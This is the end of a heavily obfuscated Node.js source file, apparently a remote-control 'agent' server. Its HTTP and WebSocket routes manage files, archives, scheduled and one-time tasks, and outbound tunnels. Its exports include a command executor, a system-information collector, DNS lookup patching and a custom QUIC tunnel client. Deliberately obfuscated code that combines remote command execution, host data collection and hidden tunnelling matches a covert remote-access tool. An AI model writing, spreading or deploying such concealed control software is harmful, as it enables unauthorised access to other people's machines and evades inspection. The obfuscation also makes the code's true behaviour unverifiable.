                const o = await a0a4[kE(0x201)](m[kE(0x274)]);
                n['json']({
                    'status': 'ok',
                    'total': o['length'],
                    'success': o['filter'](p => p[kE(0x8ab)] === 'ok')[kE(0xcfc)],
                    'results': o
                });
            } catch (p) {
                n[kE(0x8ab)](0x1f4)[kE(0x69a)]({
                    'status': kE(0xbb0),
                    'message': p['message']
                });
            }
        }), g[kn(0xb47)](b[kn(0xc86)], async (m, n) => {
            const kF = kn;
            try {
                const o = await a0a4['createDirectory'](m[kF(0x274)][kF(0x5b0)]);
                n['json'](o);
            } catch (p) {
                n[kF(0x8ab)](0x1f4)['json']({
                    'status': b[kF(0x53c)],
                    'message': p[kF(0x1f1)]
                });
            }
        }), g[kn(0xb47)](b[kn(0xc00)], async (m, n) => {
            const kG = kn;
            try {
                const o = m[kG(0x274)] || {};
                if (!o[kG(0x5b0)])
                    return n[kG(0x8ab)](0x190)[kG(0x69a)]({ 'error': b[kG(0x632)] });
                if (!Array['isArray'](o[kG(0x2f9)]) || b[kG(0x7d7)](o[kG(0x2f9)][kG(0xcfc)], 0x0))
                    return n['status'](0x190)[kG(0x69a)]({ 'error': b[kG(0x335)] });
                const p = await a0a4[kG(0xb04)](o[kG(0x5b0)], o[kG(0x2f9)], !!o[kG(0x258)]);
                n[kG(0x69a)](p);
            } catch (q) {
                const r = /Access denied/['test'](q[kG(0x1f1)]) ? 0x193 : 0x190;
                n['status'](r)[kG(0x69a)]({
                    'status': b[kG(0x53c)],
                    'message': q[kG(0x1f1)]
                });
            }
        }), g[kn(0xb47)](b[kn(0xa92)], async (m, n) => {
            const kH = kn;
            try {
                const o = m[kH(0x274)] || {};
                if (!o['path'])
                    return n[kH(0x8ab)](0x190)[kH(0x69a)]({ 'error': b[kH(0x632)] });
                const p = await a0a4[kH(0xc7d)](o['path'], o['dest_path'], b[kH(0x294)](o[kH(0xa10)], ![]), Array[kH(0xb8b)](o[kH(0x90c)]) ? o['entries'] : null);
                n[kH(0x69a)](p);
            } catch (q) {
                const r = /Access denied/['test'](q['message']) ? 0x193 : 0x190;
                n['status'](r)['json']({
                    'status': b[kH(0x53c)],
                    'message': q[kH(0x1f1)]
                });
            }
        }), g[kn(0x5f2)](b[kn(0x80b)], (m, n) => {
            const kI = kn;
            n['json'](a0a6[kI(0xc68)]());
        }), g[kn(0xb47)](b[kn(0x80b)], async (m, n) => {
            const kJ = kn;
            try {
                const o = await a0a6[kJ(0xa35)](m[kJ(0x274)]);
                n[kJ(0x69a)](o);
            } catch (p) {
                n['status'](0x1f4)[kJ(0x69a)]({
                    'status': b[kJ(0x53c)],
                    'message': p[kJ(0x1f1)]
                });
            }
        }), g['get'](b[kn(0x79e)], (m, n) => {
            const kK = kn;
            n[kK(0x69a)](a0a6[kK(0x7c6)]());
        }), g[kn(0xb47)](b[kn(0x79e)], (m, n) => {
            const kL = kn;
            try {
                const o = a0a6[kL(0xbf8)](m[kL(0x274)]);
                n[kL(0x69a)](o);
            } catch (p) {
                n[kL(0x8ab)](0x1f4)[kL(0x69a)]({
                    'status': kL(0xbb0),
                    'message': p['message']
                });
            }
        }), g[kn(0x5f2)](b[kn(0xc55)], (m, n) => {
            n['json'](a0a6['getTaskStatus']());
        }), g[kn(0x5f2)](b[kn(0x875)], (m, n) => {
            const kM = kn;
            let o = b[kM(0xc58)](parseInt, m[kM(0xd58)][kM(0xa59)], 0xa) || 0x32;
            o = Math['min'](Math[kM(0x23e)](o, 0x1), 0x64), n[kM(0x69a)](a0a6[kM(0xbaf)](o));
        }), g[kn(0x5f2)](b[kn(0x995)], (m, n) => {
            const kN = kn;
            let o = b['prnZI'](parseInt, m[kN(0xd58)][kN(0xa59)], 0xa) || 0x32;
            o = Math[kN(0x61d)](Math[kN(0x23e)](o, 0x1), 0x64), n['json'](a0a6[kN(0xbfc)](o));
        }), g[kn(0xdab)](b[kn(0x875)], (m, n) => {
            const kO = kn;
            n[kO(0x69a)](a0a6['clearOnetimeLogs']());
        }), g[kn(0xdab)](b[kn(0x995)], (m, n) => {
            const kP = kn;
            n['json'](a0a6[kP(0xa26)]());
        }), g[kn(0x5f2)](b[kn(0xb09)], (m, n) => {
            const kQ = kn;
            n[kQ(0x69a)](a0a6[kQ(0xbde)]());
        }), g['post'](b[kn(0x5b6)], async (m, n) => {
            const kR = kn;
            try {
                const o = await a0a6['executeOnetimeTasks']();
                n[kR(0x69a)](o);
            } catch (p) {
                n[kR(0x8ab)](0x1f4)[kR(0x69a)]({
                    'status': b[kR(0x53c)],
                    'message': p[kR(0x1f1)]
                });
            }
        });
        const i = {
                'debug': (...m) => a0D[kn(0x354)](m[kn(0x6e5)]('\x20')),
                'info': (...m) => a0D[kn(0xb82)](m[kn(0x6e5)]('\x20')),
                'warning': (...m) => a0D[kn(0x782)](m[kn(0x6e5)]('\x20'))
            }, j = new a0bS(i);
        g[kn(0x5f2)](b[kn(0x599)], (m, n) => {
            const kS = kn, o = j[kS(0x300)]();
            n[kS(0x69a)]({
                'status': 'ok',
                'count': o['length'],
                'tunnels': o
            });
        }), g['post'](b[kn(0x599)], async (m, n) => {
            const kT = kn;
            try {
                const o = b[kT(0x3e9)](a0bR, m['body']);
                let p = o['port'];
                (p === undefined || b[kT(0xade)](p, null) || b['AaRrH'](p, '')) && (p = a0P[kT(0x2ab)]);
                const q = b[kT(0x39b)](Number, p);
                if (!Number[kT(0xa95)](q) || q < 0x1 || b[kT(0xda3)](q, 0xffff))
                    return n[kT(0x8ab)](0x1a6)[kT(0x69a)]({
                        'status': b[kT(0x53c)],
                        'created': ![],
                        'port': p,
                        'message': kT(0x894)
                    });
                const r = await j[kT(0x5c8)](q, b[kT(0xd72)](o[kT(0x6d1)], !![]), b[kT(0x67c)](o['quic'], !![]) || b[kT(0x9ce)](o['quic'], 0x1) || b[kT(0x325)](b['gWBvt'](String, o[kT(0x4a0)])[kT(0xc48)](), b[kT(0xc3b)]));
                n[kT(0x69a)]({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': r[kT(0x832)],
                    'port': r[kT(0x694)],
                    'created_at': r[kT(0x7c8)],
                    'transport': r[kT(0x288)]
                });
            } catch (s) {
                n['status'](s[kT(0x8ab)] || 0x1f4)[kT(0x69a)]({
                    'status': 'error',
                    'created': ![],
                    'port': s['port'] ?? null,
                    'message': s[kT(0x1f1)]
                });
            }
        }), g[kn(0xdab)](b[kn(0x599)], async (m, n) => {
            const kU = kn;
            try {
                const o = a0bR(m[kU(0x274)]), p = o[kU(0x694)], q = Number(p);
                if (p === undefined || b[kU(0x3d7)](p, null) || p === '' || !Number['isInteger'](q) || b['IMegU'](q, 0x1) || b[kU(0xda3)](q, 0xffff))
                    return n[kU(0x8ab)](0x1a6)[kU(0x69a)]({
                        'status': b[kU(0x53c)],
                        'deleted': 0x0,
                        'port': p ?? null,
                        'message': kU(0x82b)
                    });
                const r = await j[kU(0x384)](q, o[kU(0x367)]);
                if (r[kU(0x8ab)] === 'ok')
                    return n['json']({
                        'status': 'ok',
                        'deleted': r[kU(0xa75)],
                        'port': q,
                        'tunnels': r[kU(0x668)]
                    });
                return n[kU(0x8ab)](r[kU(0x8ab)])['json']({
                    'status': b[kU(0x53c)],
                    'deleted': 0x0,
                    'port': q,
                    'message': r[kU(0x1f1)]
                });
            } catch (s) {
                n[kU(0x8ab)](0x1f4)['json']({
                    'status': b[kU(0x53c)],
                    'deleted': 0x0,
                    'message': s[kU(0x1f1)]
                });
            }
        }), a0D['debug'](b[kn(0x6ba)]), g['ws'](b[kn(0xba4)], async (m, n) => {
            const kV = kn, o = n[kV(0xbd4)][0x0];
            a0D['debug'](kV(0x779) + n[kV(0x658)]), a0D[kV(0x354)]('Matched\x20Sub-path:\x20' + o);
            const p = n[kV(0xd58)][kV(0xb52)], q = n[kV(0xd58)]['token'], r = b[kV(0x212)](n[kV(0xd58)][kV(0x32f)], '1'), s = b['xSXqC'](n[kV(0xd58)][kV(0x837)], '1');
            a0D[kV(0x354)]('WebSocket\x20connection\x20attempt\x20with\x20request_id:\x20' + p);
            if (!p) {
                a0D[kV(0x354)](kV(0x58f)), m[kV(0xd8e)](0x3f0, b[kV(0x777)]);
                return;
            }
            if (q) {
                const u = a0P['wsDowngradeToken'](), v = Buffer[kV(0x581)](b[kV(0x5f5)](String, q), b[kV(0xc1a)]), w = Buffer[kV(0x581)](u, b[kV(0xc1a)]), x = b[kV(0x1b7)](v[kV(0xcfc)], w[kV(0xcfc)]) && a0k[kV(0x5b2)](v, w);
                if (!x) {
                    a0D[kV(0x782)](kV(0x885) + p + kV(0x24d)), m[kV(0xd8e)](0x3f0, b[kV(0x2bd)]);
                    return;
                }
            }
            const t = new a0bZ();
            await t[kV(0x249)](m, p, q, r, s);
        }), a0D['debug'](b['BvNtg']), a0a6[kn(0x69b)](), a0D[kn(0x354)](b[kn(0x3bf)]);
        const k = g['listen'](a0P[kn(0x2ab)], a0P['HOST'], () => {
            const kW = kn;
            a0D['debug']('🚀\x20Kisama\x20Agent\x20Node.js\x20v' + a0P[kW(0xc9f)] + '\x20started\x20on\x20' + a0P[kW(0x5c5)] + ':' + a0P[kW(0x2ab)]), a0D[kW(0x354)](b[kW(0xd53)]), (b[kW(0xba9)](a0P[kW(0xbb7)], '1') || a0P[kW(0xbb7)] === '2' && a0bT[kW(0xb73)]()) && a0bT[kW(0x6f8)](j);
        });
        process['on'](b[kn(0x3fb)], () => {
            const kX = kn;
            a0D[kX(0x354)](b[kX(0xcbd)]), k[kX(0xd8e)](), process['exit'](0x0);
        }), a0D[kn(0x354)](kn(0x6f1));
    } catch (m) {
        a0D['error'](b[kn(0x4e1)], m), process['exit'](0x1);
    }
}
(require[a0c4(0x822)] === module || require[a0c4(0x822)]?.[a0c4(0x7a1)]?.['includes'](a0c4(0x27d))) && a0c1()[a0c4(0x22d)](a0D['error']);
module[a0c4(0x2fe)] = {
    'main': a0c1,
    'loadCurves': a0c0,
    'Config': a0P,
    'CryptoManager': a0X,
    'SystemInfoCollector': a0a0,
    'CommandExecutor': a0a1,
    'FileManager': a0a4,
    'TaskManager': a0a6,
    'TaskStore': a0a5,
    'ArgoTunnelManager': a0bS,
    'KModeController': a0bT,
    'ZipArchiver': a0a3,
    'TempKeyManager': a0W,
    'SecureDns': a0S,
    'installDnsHook': a0V,
    'patchDnsLookup': a0U,
    'QuicConnection': a0bF,
    'QuicSession': a0bK,
    'QuicTlsClient': a0bC,
    'QuicKeys': a0bm,
    'QuicReader': a0bi,
    'quicInitialKeys': a0bo,
    'quicNextKeys': a0bn,
    'quicWriteVarint': a0bf,
    'quicReadVarint': a0bg,
    'quicDecodePacketNumber': a0bv,
    'quicApplyProtection': a0bt,
    'quicRemoveProtection': a0bu,
    'quicEncodeTransportParameters': a0bz,
    'quicDecodeTransportParameters': a0by,
    'quicEncodeAck': a0bw,
    'quicRangesFromAck': a0bx,
    'hkdfExpandLabel': a0bl,
    'CapnpBuilder': a0ap,
    'capnpMessages': a0as,
    'capnpWords': a0au,
    'capnpStruct': a0at,
    'capnpText': a0aw,
    'capnpStructList': a0av,
    'capnpReturnResult': a0ax,
    'capnpConnectRequest': a0ay,
    'capnpConnectResponse': a0az,
    'connectEdgeQuic': a0bL,
    'buildQuicRequest': a0bH,
    'verifyEdgeQuicCertificate': a0bD,
    'QUIC_DATA_STREAM_PREAMBLE': a0aS,
    'QUIC_SERVER_NAME': a0b1,
    'QUIC_ALPN': a0b0
};